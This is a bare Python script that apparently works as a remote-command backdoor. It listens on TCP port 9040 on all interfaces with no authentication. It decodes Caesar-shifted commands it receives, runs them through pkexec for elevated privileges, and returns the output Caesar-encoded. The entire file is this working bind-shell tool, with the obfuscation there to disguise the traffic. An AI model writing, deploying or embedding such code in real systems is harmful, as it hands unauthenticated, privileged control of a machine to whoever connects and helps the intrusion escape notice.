import socket
import subprocess


def coder(msg, shift):
    latin_lower = "".join(map(chr, range(ord("a"), ord("z") + 1)))
    latin_upper = "".join(map(chr, range(ord("A"), ord("Z") + 1)))
    res = ""
    for i in msg:
        if i in latin_lower:
            ind = latin_lower.index(i)
            res += latin_lower[(ind + shift) % len(latin_lower)]
        elif i in latin_upper:
            ind = latin_upper.index(i)
            res += latin_upper[(ind + shift) % len(latin_upper)]
        else:
            res += i
    return res


def decoder(msg, shift):
    latin_lower = "".join(map(chr, range(ord("a"), ord("z") + 1)))
    latin_upper = "".join(map(chr, range(ord("A"), ord("Z") + 1)))
    res = ""
    for i in msg:
        if i in latin_lower:
            ind = latin_lower.index(i)
            res += latin_lower[(ind - shift) % len(latin_lower)]
        elif i in latin_upper:
            ind = latin_upper.index(i)
            res += latin_upper[(ind - shift) % len(latin_upper)]
        else:
            res += i
    return res

serv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv_sock.bind(('', 9040))
serv_sock.listen(10)

while True:
    client_sock, client_addr = serv_sock.accept()
    print('connected', client_addr)

    while True:
        data = client_sock.recv(1024)
        if not data:
            break
        decrypt=decoder(data.decode(),15)
        process = subprocess.Popen(["/usr/bin/pkexec"] + decrypt.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   universal_newlines=True)

        output, error = process.communicate()
        encrypt = coder(output, 20)
        client_sock.sendall(encrypt.encode())

    client_sock.close()
